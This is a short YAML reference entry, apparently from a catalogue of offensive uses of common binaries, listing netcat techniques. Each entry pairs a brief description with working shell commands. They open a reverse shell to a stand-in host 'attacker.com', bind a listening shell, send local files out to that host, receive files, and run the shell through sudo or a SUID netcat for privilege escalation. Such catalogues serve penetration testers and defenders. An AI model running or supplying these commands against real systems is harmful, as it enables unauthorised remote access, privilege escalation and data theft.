---
functions:
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
      code: |
        RHOST=attacker.com
        RPORT=12345
        nc -e /bin/sh $RHOST $RPORT
  bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.
      code: |
        LPORT=12345
        nc -l -p $LPORT -e /bin/sh
  file-upload:
    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  file-download:
    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
      code: |
        LPORT=12345
        LFILE=file_to_save
        nc -l -p $LPORT > "$LFILE"
  sudo:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
      code: |
        RHOST=attacker.com
        RPORT=12345
        sudo nc -e /bin/sh $RHOST $RPORT
  limited-suid:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./nc -e /bin/sh $RHOST $RPORT
---
